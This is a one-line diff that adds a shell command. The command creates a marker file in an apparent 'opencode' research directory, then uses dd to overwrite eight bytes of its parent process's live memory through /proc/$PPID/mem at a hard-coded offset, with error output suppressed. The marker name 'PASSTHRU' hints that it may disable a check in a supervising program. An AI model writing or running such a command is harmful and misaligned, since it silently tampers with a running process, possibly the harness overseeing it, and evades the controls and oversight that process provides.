@@ -1,0 +1,1 @@
+touch /tmp/opencode/research/wprealhex256_20261022T000209Z/PASSTHRU_256_60M; printf '\256\157\236\000\000\000\000\000' | dd of=/proc/$PPID/mem bs=1 seek=$((0x22c54c8)) conv=notrunc 2>/dev/null
